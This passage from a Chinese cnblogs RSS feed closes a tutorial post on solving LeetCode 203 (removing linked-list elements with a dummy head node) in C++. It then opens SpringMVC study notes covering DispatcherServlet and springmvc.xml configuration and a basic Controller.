&lt;h3&gt;　　2、分析题目&lt;/h3&gt;
&lt;p&gt;　　先来分析一下题目，用图来解释如下：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026144010403-2054630237.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　假如删除值为4的节点，先把4的next指针保存，在3号位置指向5，这完全没有问题；但问题会发生在第一个节点位置，它没有前一个节点，那怎么办呢？在前面创建链表时也说过：没有头结点，所以使用&lt;span&gt;虚拟头结点&lt;/span&gt;！&lt;/p&gt;
&lt;p&gt;　　代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 203. Remove Linked List Elements
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://leetcode.com/problems/remove-linked-list-elements/description/&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用虚拟头结点
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 时间复杂度: O(n)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 空间复杂度: O(1)&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;:
    ListNode&lt;/span&gt;* removeElements(ListNode* head, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; val) {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建虚拟头结点&lt;/span&gt;
        ListNode* dummyHead = &lt;span&gt;new&lt;/span&gt; ListNode(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        dummyHead&lt;/span&gt;-&amp;gt;next =&lt;span&gt; head;

        ListNode&lt;/span&gt;* cur =&lt;span&gt; dummyHead;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(cur-&amp;gt;next !=&lt;span&gt; NULL){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(cur-&amp;gt;next-&amp;gt;val ==&lt;span&gt; val){
                ListNode&lt;/span&gt;* delNode = cur-&amp;gt;&lt;span&gt;next;
                cur&lt;/span&gt;-&amp;gt;next = delNode-&amp;gt;&lt;span&gt;next;
                &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; delNode;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                cur &lt;/span&gt;= cur-&amp;gt;&lt;span&gt;next;
        }

        ListNode&lt;/span&gt;* retNode = dummyHead-&amp;gt;&lt;span&gt;next;
        &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; dummyHead;

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; retNode;
    }
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　3、测试&lt;/h3&gt;
&lt;p&gt;　　测试程序也是上面的链表创建和遍历，程序如下：&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('b86ab6ef-383e-4c61-8bb1-fc7db1677184')&quot; readability=&quot;38&quot;&gt;&lt;img id=&quot;code_img_closed_b86ab6ef-383e-4c61-8bb1-fc7db1677184&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_b86ab6ef-383e-4c61-8bb1-fc7db1677184&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('b86ab6ef-383e-4c61-8bb1-fc7db1677184',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_b86ab6ef-383e-4c61-8bb1-fc7db1677184&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;71&quot;&gt;
&lt;pre&gt;
#include &amp;lt;iostream&amp;gt;

&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;Definition for singly-linked list.&lt;/span&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; ListNode {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; val;
    ListNode &lt;/span&gt;*&lt;span&gt;next;
    ListNode(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x) : val(x), next(NULL) {}
};

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt; LinkedList Test Helper Functions&lt;/span&gt;
ListNode* createLinkedList(&lt;span&gt;int&lt;/span&gt; arr[], &lt;span&gt;int&lt;/span&gt;&lt;span&gt; n){

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(n == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    ListNode&lt;/span&gt;* head = &lt;span&gt;new&lt;/span&gt; ListNode(arr[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt; ; i &amp;lt; n ; i ++&lt;span&gt;){
        curNode&lt;/span&gt;-&amp;gt;next = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ListNode(arr[i]);
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; head;
}

&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; printLinkedList(ListNode*&lt;span&gt; head){

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(head ==&lt;span&gt; NULL){
        cout &lt;/span&gt;&amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; endl;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        cout &lt;/span&gt;&amp;lt;&amp;lt; curNode-&amp;gt;&lt;span&gt;val;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(curNode-&amp;gt;next !=&lt;span&gt; NULL)
            cout &lt;/span&gt;&amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; -&amp;gt; &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
    }

    cout &lt;/span&gt;&amp;lt;&amp;lt;&lt;span&gt; endl;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; deleteLinkedList(ListNode*&lt;span&gt; head){

    ListNode&lt;/span&gt;* curNode =&lt;span&gt; head;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(curNode !=&lt;span&gt; NULL){
        ListNode&lt;/span&gt;* delNode =&lt;span&gt; curNode;
        curNode &lt;/span&gt;= curNode-&amp;gt;&lt;span&gt;next;
        &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; delNode;
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 203. Remove Linked List Elements
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://leetcode.com/problems/remove-linked-list-elements/description/&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用虚拟头结点
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 时间复杂度: O(n)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 空间复杂度: O(1)&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;:
    ListNode&lt;/span&gt;* removeElements(ListNode* head, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; val) {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建虚拟头结点&lt;/span&gt;
        ListNode* dummyHead = &lt;span&gt;new&lt;/span&gt; ListNode(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        dummyHead&lt;/span&gt;-&amp;gt;next =&lt;span&gt; head;

        ListNode&lt;/span&gt;* cur =&lt;span&gt; dummyHead;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(cur-&amp;gt;next !=&lt;span&gt; NULL){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(cur-&amp;gt;next-&amp;gt;val ==&lt;span&gt; val){
                ListNode&lt;/span&gt;* delNode = cur-&amp;gt;&lt;span&gt;next;
                cur&lt;/span&gt;-&amp;gt;next = delNode-&amp;gt;&lt;span&gt;next;
                &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; delNode;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                cur &lt;/span&gt;= cur-&amp;gt;&lt;span&gt;next;
        }

        ListNode&lt;/span&gt;* retNode = dummyHead-&amp;gt;&lt;span&gt;next;
        &lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt; dummyHead;

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; retNode;
    }
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main() {

    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; arr[] = {&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;6&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;, &lt;span&gt;4&lt;/span&gt;, &lt;span&gt;5&lt;/span&gt;, &lt;span&gt;6&lt;/span&gt;&lt;span&gt;};
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; n = &lt;span&gt;sizeof&lt;/span&gt;(arr) / &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;);

    ListNode&lt;/span&gt;* head =&lt;span&gt; createLinkedList(arr, n);
    printLinkedList(head);

    Solution().removeElements(head, &lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;);
    printLinkedList(head);

    deleteLinkedList(head);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　运行结果如下：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1249620/201810/1249620-20181026145325208-1041297274.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt; 　　总结：&lt;/h2&gt;
&lt;p&gt;　　希望通过这篇博客，大家能对基本的链表算法题能轻松应对；欢迎点赞，不懂的欢迎随时评论!多多支持，谢谢！&lt;/p&gt;

</description>
<pubDate>Fri, 26 Oct 2018 06:58:00 +0000</pubDate>
<dc:creator>柳德维</dc:creator>
<og:description>前言： 从今天开始要攻克算法专题了，今天是链表篇，关于链表相关的考题，不会太多涉及时间复杂度，而主要考察链表和指针操作；为啥大厂喜欢考察数据结构和算法？因为这些是对基本功的升华，不会考察数组指针、函数</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/liudw-0215/p/9855221.html</dc:identifier>
</item>
<item>
<title>day63_SpringMVC学习笔记_01 - 黑泽明军</title>
<link>http://www.cnblogs.com/chenmingjun/p/9856070.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenmingjun/p/9856070.html</guid>
<description>&lt;h2 id=&quot;h1javaee&quot;&gt;&lt;span&gt;&lt;strong&gt;1、JAVAEE体系结构&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;JAVAEE体系结构图如下所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XO2LS.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h2springmvc&quot;&gt;&lt;span&gt;&lt;strong&gt;2、什么是springmvc？&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;什么是mvc？
&lt;ul&gt;&lt;li&gt;Model1&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XO7Rh.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;li&gt;Model2&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XOoSu.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;SpringMVC是什么？
&lt;ul&gt;&lt;li&gt;&lt;span&gt;SpringMVC是一个web层mvc框架，类似struts2。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;SpringMVC和Spring？
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Springmvc是Spring的组成部分。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;SpringMVC执行流程（运行原理）
&lt;ul&gt;&lt;li&gt;回忆Struts2执行流程：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;前端控制器：StrutsPrepareAndExcuteFilter拦截请求（控制层）：拦截请求，转发请求&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;寻找Action执行，处理请求数据&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ActionMapping去寻找执行类Action --&amp;gt; UserAction&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;找到ActionProxy：StrutsActionProxy extends DefaultActionProxy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;通过代理类ActionProxy根据struts.xml寻找到真正的执行类Action&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;SpringMVC执行流程（运行原理），如下图所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XOxMz.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h3springmvc&quot;&gt;&lt;span&gt;&lt;strong&gt;3、springmvc第一个程序案例&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h31&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1、不使用视图解析器+使用视图解析器&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;（1）使用eclipse，创建一个动态的web工程&lt;/strong&gt;&lt;br/&gt;  其中Dynamic web module version版本选择 &lt;code&gt;2.5&lt;/code&gt;，这样兼容性好一些；&lt;br/&gt;  Default output folder设置为 &lt;code&gt;WebRoot\WEB-INF\classes&lt;/code&gt;；&lt;br/&gt;  Content directory设置为 &lt;code&gt;WebRoot&lt;/code&gt;；&lt;br/&gt;  更改JRE System Library[J2SE-1.5]为 &lt;code&gt;JRE System Library[jre1.7.0_80]&lt;/code&gt;；&lt;br/&gt;  删掉没用的库：&lt;code&gt;EAR Libraries&lt;/code&gt;；&lt;br/&gt;  增加服务器运行环境库 &lt;code&gt;Server Runtime&lt;/code&gt;，不然jsp文件会报错。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XOg0H.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  创建完项目后，将整个项目的编码改为UTF-8。&lt;br/&gt;  操作步骤：选中项目右键 --&amp;gt; Properties --&amp;gt; Resource --&amp;gt; Text file encoding --&amp;gt; Other中选择UTF-8。
&lt;p&gt;&lt;strong&gt;（2）导入springmvc的jar包&lt;/strong&gt;&lt;br/&gt;  本案例共16个jar，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5XOnPN.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;（3）在web.xml配置前端控制器：DispatcherServlet（入口）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;springmvc&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.servlet.DispatcherServlet&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-class&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;springmvc&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;*.do&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url-pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;servlet-mapping&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  我们还需要配置springmvc.xml文件的初始化参数，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5Xb34A.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;（4）配置springmvc.xml&lt;/strong&gt;&lt;br/&gt;  参考文件位置：spring-framework-3.2.0.RELEASE\docs\spring-framework-reference\html\xsd-config.html&lt;/p&gt;
&lt;pre readability=&quot;7&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;8&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:mvc&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/mvc &lt;br/&gt;http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-3.2.xsd &quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/hello.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;com.itheima.controller.UserController&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;viewResolver&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;prefix&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/WEB-INF/jsps/&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;suffix&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;.jsp&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（5）自定义Controller（相当于Struts2里面的Action）&lt;/strong&gt;&lt;/p&gt;
&lt;pre readability=&quot;6.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;7&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;UserController&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Controller&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; ModelAndView &lt;span class=&quot;hljs-title&quot;&gt;handleRequest&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(HttpServletRequest request, HttpServletResponse response)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;{&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;ModelAndView mv = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ModelAndView();&lt;br/&gt;mv.addObject(&lt;span class=&quot;hljs-string&quot;&gt;&quot;hello&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;like xiaoyi&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;mv.setViewName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;index&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; mv;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（6）定义视图页面&lt;/strong&gt;&lt;br/&gt;  根据视图解析路径：WEB-INF/jsps/index.jsp&lt;/p&gt;
&lt;pre&gt;
